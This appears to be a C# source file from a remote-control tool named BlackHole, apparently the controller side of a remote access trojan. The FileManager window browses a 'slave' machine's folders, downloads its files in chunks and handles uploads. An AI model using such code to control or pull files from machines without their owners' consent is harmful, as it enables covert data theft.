using BlackHole.Common;
using BlackHole.Common.Network.Protocol;
using BlackHole.Master.Model;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Media;

namespace BlackHole.Master
{
    /// <summary>
    /// 
    /// </summary>
    public partial class FileManager : ISlaveWindow
    {
        /// <summary>
        /// 
        /// </summary>
        public ViewModelCollection<FileMeta> ViewModelFiles
        {
            get;
            private set;
        }

        /// <summary>
        /// 
        /// </summary>
        public ViewModelCollection<FileTransaction> ViewModelFileTransactions
        {
            get;
            private set;
        }

        /// <summary>
        /// 
        /// </summary>
        public Slave Slave
        {
            get;
            private set;
        }

        /// <summary>
        /// 
        /// </summary>
        private int m_nextTransactionId, m_sucessfulTransactions;

        /// <summary>
        /// 
        /// </summary>
        private Queue<FileDownload> m_pendingDownloads;

        /// <summary>
        /// 
        /// </summary>
        private bool m_downloading;

        /// <summary>
        /// 
        /// </summary>
        /// <param name="slave"></param>
        public FileManager(Slave slave) : this()
        {
            m_pendingDownloads = new Queue<FileDownload>();
            m_downloading = false;

            Slave = slave;

            TargetStatusBar.DataContext = slave;

            FileTransactionsList.DataContext = ViewModelFileTransactions = new ViewModelCollection<FileTransaction>();
            FilesList.DataContext = ViewModelFiles = new ViewModelCollection<FileMeta>();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="folder"></param>
        private void NavigateToFolder(string folder)
        {
            this.Send(new NavigateToFolderMessage()
            {
                Path = Path.Combine(TxtBoxDirectory.Text, folder)
            });
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="path"></param>
        private void DownloadFile(string name)
        {
            m_pendingDownloads.Enqueue(
                CreateFileTransaction<FileDownload>(
                    m_nextTransactionId++,
                    Path.Combine(TxtBoxDirectory.Text, name)));        
            ProcessNextDownload();            
        }

        /// <summary>
        /// 
        /// </summary>
        private void FinishDownloading()
        {
            m_downloading = false;
            ProcessNextDownload();
        }

        /// <summary>
        /// 
        /// </summary>
        private void ProcessNextDownload()
        {
            if (m_downloading)
                return;
            
            if (m_pendingDownloads.Count == 0)
                return;

            m_downloading = true;

            var download = m_pendingDownloads.Dequeue();
            this.Send(new DownloadFilePartMessage()
            {
                Id = download.Id,
                CurrentPart = 0,
                Path = download.FilePath
            });
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="ev"></param>
        public async Task OnEvent(SlaveEvent ev)
        {
            await this.ExecuteInDispatcher(() =>
            {
                switch((SlaveEventType)ev.EventType)
                {
                    case SlaveEventType.INCOMMING_MESSAGE:
                        ev.Data
                            .Match()
                            .With<FolderNavigationMessage>(m =>
                            {
                                TxtBoxDirectory.Text = m.Path;
                                ViewModelFiles.Items.Clear();
                                m.Files.ForEach(ViewModelFiles.Items.Add);
                            })
                            .With<StatusUpdateMessage>(m =>
                            {
                                TargetStatus.Content = m.Operation;
                                TargetStatusTooltipTitle.Text = m.Operation;
                                TargetStatusTooltipMessage.Text = m.Message;
                                TargetStatus.Foreground = m.Success ? Brushes.DarkGreen : Brushes.Red;
                                TargetStatusTooltip.PlacementTarget = TargetStatus;
                                TargetStatusTooltip.IsOpen = true;
                            })
                            .With<DownloadedFilePartMessage>(m =>
                            {
                                UpdateFileTransaction<FileDownload>(m,

                                    // on finished, flush the file into the local directory
                                    (download) =>
                                    {
                                        var raw = download.RawFile.ToArray();
                                        Slave.SaveDownloadedFile(download.Name, raw);
                                        Slave.SlaveEvents.PostEvent(new SlaveEvent(SlaveEventType.FILE_DOWNLOADED, Slave, raw));
                                        FinishDownloading();
                                    },

                                    // on cancellation, try to download the next file
                                    () => FinishDownloading(),

                                    // if not completed, try to get the next chunck
                                    (download) =>
                                    {
                                        this.Send(new DownloadFilePartMessage()
                                        {
                                            Id = download.Id,
                                            Path = download.FilePath,
                                            CurrentPart = m.CurrentPart + 1 
                                        });
                                    });
                            })
                            .With<DownloadFilePartMessage>(m =>
                            {
                                Utility.ExecuteComplexOperation( 
                                    () => CommonHelper.DownloadFilePart(m.Id, m.CurrentPart, m.Path),
                                    (downloadedPart) => 
                                    {
                                        UpdateFileTransaction<FileUpload>(downloadedPart,
                                            (upload) =>
                                            {
                                                Slave.SlaveEvents.PostEvent(new SlaveEvent(SlaveEventType.FILE_UPLOADED, Slave, upload.FilePath));
                                            },
                                            () => { },
                                            (upload) => this.Send(downloadedPart));                                        
                                    },
                                    (e) =>
                                    {
                                        Slave.SlaveEvents.PostEvent(
                                            new SlaveEvent(
                                                SlaveEventType.INCOMMING_MESSAGE,
                                                Slave,
                                                new StatusUpdateMessage()
                                                {
                                                    Operation = "File upload",
                                                    Success = false,
                                                    Message = e.Message
                                                }));
                                    });
                            });                        
                        break;
                }
            });
        }

        /// <summary>
        /// 
        /// </summary>
        /// <typeparam name="T"></typeparam>
        /// <param name="part"></param>
        private void UpdateFileTransaction<T>(DownloadedFilePartMessage part, Action<T> onCompleted, Action onCanceled, Action<T> onContinue)
            where T : FileTransaction, new()
        {
            var model = FindFileTransaction<T>(part);

            // transaction was prolly cancelled
            if (model == null)
            {
                onCanceled();
                return;
            }

            model.UpdateTransaction(part);

            // transaction is completed, callback to continue
            if (!model.Completed)
            {
                onContinue(model);
                return;
            }


            onCompleted(model);

            TotalTransaction.Content = "Total transactions : " + ++m_sucessfulTransactions;

            // we delay the remove so we see small file downloads, otherwise it would be dropped instantly (download too fast)
            Dispatcher.DelayInvoke(TimeSpan.FromMilliseconds(2000), () => ViewModelFileTransactions.Items.Remove(model));
        }
            
        /// <summary>
        /// 
        /// </summary>
        /// <param name="part"></param>
        /// <returns></returns>
        private T FindOrCreateFileTransaction<T>(DownloadedFilePartMessage part)
            where T : FileTransaction, new()
        {
            var model = FindFileTransaction<T>(part);
            if (model == null)
                model = CreateFileTransaction<T>(part.Id, part.Path);
            return model;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <typeparam name="T"></typeparam>
        /// <param name="partId"></param>
        /// <param name="filePath"></param>
        /// <returns></returns>
        private T CreateFileTransaction<T>(int partId, string filePath) where T : FileTransaction, new()
        {
            var model = new T()
            {
                Id = partId,
                FilePath = filePath
            };
            ViewModelFileTransactions.Items.Add(model);
            return model;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="id"></param>
        /// <returns></returns>
        private T FindFileTransaction<T>(DownloadedFilePartMessage part)
            where T : FileTransaction
            => ViewModelFileTransactions.Items.OfType<T>().FirstOrDefault(mod => mod.Id == part.Id);
    }
}
